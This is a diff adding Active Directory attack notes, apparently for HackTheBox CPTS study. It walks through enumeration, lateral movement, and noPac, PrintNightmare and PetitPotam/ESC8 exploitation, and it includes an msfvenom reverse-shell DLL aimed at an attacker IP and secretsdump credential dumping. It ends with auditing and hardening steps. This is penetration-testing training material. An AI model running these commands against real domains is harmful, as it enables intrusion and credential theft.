@@ -184,6 +184,12 @@ HackTheBox Certified Penetration Tester Specialist (CPTS) notes — reorganized,
     - [From Windows](#from-windows-1)
     - [From Linux](#from-linux-1)
   - [AD Tooling, External Recon & Advanced Attacks](#ad-tooling-external-recon--advanced-attacks)
+    - [Domain & External Enumeration Commands](#domain--external-enumeration-commands)
+    - [Privileged Access & Lateral Movement](#privileged-access--lateral-movement)
+    - [Kerberos Double Hop](#kerberos-double-hop)
+    - [Bleeding-Edge AD Vulnerabilities](#bleeding-edge-ad-vulnerabilities)
+    - [ADIDNS, GPP & GPO Enumeration](#adidns-gpp--gpo-enumeration)
+    - [AD Auditing & Hardening](#ad-auditing--hardening)
 - [11. SQLMap](#11-sqlmap)
   - [Advanced SQLMap Options](#advanced-sqlmap-options)
 - [12. Attacking Common Web Applications](#12-attacking-common-web-applications)
@@ -3267,6 +3273,167 @@ AD hardening and auditing:
 - Enforce LDAP signing/channel binding; protect AD CS templates.
 - Patch DCs and monitor replication, DCSync, and privilege changes.
 - Audit ACLs, SPNs, password policy, and privileged group membership.
+
+#### Domain & External Enumeration Commands
+
+```bash
+# DNS and public exposure
+nslookup ns1.<DOMAIN>
+dig any <DOMAIN>
+
+# Breach/OSINT lookup (authorized engagements only)
+sudo python3 dehashed.py -q <DOMAIN> -p
+
+# Kerbrute build and username enumeration
+sudo git clone https://github.com/ropnop/kerbrute.git
+cd kerbrute
+make help
+sudo make all
+ls dist/
+kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt -o valid_ad_users
+```
+
+#### Privileged Access & Lateral Movement
+
+```powershell
+# Who can log on where
+Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Desktop Users"
+Get-NetLocalGroupMember -ComputerName <HOST> -GroupName "Remote Management Users"
+
+# PSSession with explicit credentials
+$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USER>", $password)
+Enter-PSSession -ComputerName <HOST> -Credential $cred
+```
+
+```bash
+# WinRM
+gem install evil-winrm
+evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>'
+```
+
+```powershell
+# MSSQL discovery and querying
+cd .\PowerUpSQL\
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+Get-SQLQuery -Verbose -Instance "<SQL_HOST>,1433" -username "<DOMAIN>\<USER>" -password "<PASSWORD>" -query 'Select @@version'
+```
+
+```bash
+mssqlclient.py <DOMAIN>/<USER>@<SQL_HOST> -windows-auth
+```
+
+#### Kerberos Double Hop
+
+The double-hop problem occurs when a PowerShell remoting session cannot reuse the user's credentials for a second network hop.
+
+```powershell
+Enter-PSSession -ComputerName <HOST> -Credential <DOMAIN>\<USER>
+klist
+
+# Workaround: register a session configuration that runs as the target user
+Register-PSSessionConfiguration -Name <CONFIG> -RunAsCredential <DOMAIN>\<USER>
+Enter-PSSession -ComputerName <HOST> -Credential <DOMAIN>\<USER> -ConfigurationName <CONFIG>
+```
+
+Other approaches: CredSSP, constrained delegation, or Kerberos delegation. Check for unconstrained delegation and `TrustedForDelegation` accounts.
+
+#### Bleeding-Edge AD Vulnerabilities
+
+**noPac (CVE-2021-42278 / CVE-2021-42287)** — sAMAccountName spoofing:
+
+```bash
+git clone https://github.com/Ridter/noPac.git
+sudo python3 scanner.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
+sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> \
+  -dc-host <DC_HOST> -shell --impersonate administrator -use-ldap
+sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> \
+  -dc-host <DC_HOST> --impersonate administrator -use-ldap \
+  -dump -just-dc-user <DOMAIN>/administrator
+```
+
+**PrintNightmare (CVE-2021-1675 / CVE-2021-34527)** — print spooler:
+
+```bash
+rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -f dll > payload.dll
+sudo smbserver.py -smb2support CompData /path/to/payload.dll
+sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> '\\<ATTACKER_IP>\CompData\payload.dll'
+```
+
+**PetitPotam + AD CS (ESC8)** — coerce a DC to authenticate to a relay:
+
+```bash
+sudo ntlmrelayx.py -debug -smb2support \
+  --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController
+python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
+
+# Use the issued certificate to obtain a TGT
+python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOST>$ \
+  -pfx-base64 <PFX_BASE64> dc01.ccache
+export KRB5CCNAME=dc01.ccache
+secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass \
+  "<DC_HOST>$"@<DC_FQDN>
+```
+
+**Zerologon (CVE-2020-1472)** — only on unpatched DCs; check the patch level first. These attacks can be disruptive and are often detected.
+
+#### ADIDNS, GPP & GPO Enumeration
+
+```bash
+# AD-integrated DNS records
+adidnsdump -u '<DOMAIN>\<USER>' ldap://<DC_IP>
+head records.csv
+adidnsdump -u '<DOMAIN>\<USER>' ldap://<DC_IP> -r
+```
+
+```powershell
+# SYSVOL scripts and Group Policy Preferences
+ls \\<DC>\SYSVOL\<DOMAIN>\scripts
+cat \\<DC>\SYSVOL\<DOMAIN>\scripts\<FILE>
+
+Get-DomainGPO | select displayname
+Get-GPO -All | Select DisplayName
+$sid = Convert-NameToSid "Domain Users"
+Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
+```
+
+```bash
+# GPP cpassword decryption and autologin discovery
+gpp-decrypt <GPP_STRING>
+crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>' -M gpp_autologin
+```
+
+#### AD Auditing & Hardening
+
+```powershell
+# Protected Users and reversible-password accounts
+Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |
+  select samaccountname,useraccountcontrol
+```
+
+```powershell
+# Auditing tools
+PingCastle.exe --help
+group3r.exe -f <filepath-name.log>
+.\ADRecon.ps1
+```
+
+Hardening checklist:
+
+- Tiered administration; separate Domain Admin, Server Admin, and Workstation Admin roles.
+- LAPS for local administrator passwords; remove inactive accounts.
+- Disable LLMNR/NBT-NS and mDNS where possible.
+- Restrict Kerberos delegation; remove unconstrained delegation.
+- Enforce LDAP signing/channel binding; protect AD CS templates.
+- Patch DCs and monitor replication, DCSync, and privilege changes.
+- Audit ACLs, SPNs, password policy, and privileged group membership.
+- Use Protected Users for high-value accounts and disable reversible password storage.
+
+> The AD skills-assessment sections are intentionally not summarized. Complete them in the HTB Academy lab.
 
 ## 11. SQLMap
 
